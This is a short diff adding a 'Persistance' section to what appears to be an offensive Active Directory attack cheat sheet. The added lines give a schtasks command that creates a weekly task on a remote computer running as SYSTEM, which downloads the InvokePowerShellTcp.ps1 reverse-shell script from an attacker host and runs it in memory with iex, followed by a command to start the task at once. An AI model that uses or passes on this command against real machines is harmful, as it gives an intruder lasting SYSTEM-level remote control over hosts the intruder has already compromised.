@@ -230,6 +230,15 @@ Check TGT or TGS in memory of compromise machine
 
 
 # Persistance
+  
+Via schedule task:
+  ```
+   schtasks /create /S <COMPUTER> /SC
+Weekly /RU "NT Authority\SYSTEM" /TN myTask /TR "powershell.exe -c 'iex
+(New-Object Net.WebClient).DownloadString(''http://<my_ip_addr>/InvokePowerShellTcp.ps1''')'"
+
+ schtasks /Run /S <COMPUTER> /TN myTask
+  ```
 
 DSRM persistance
 
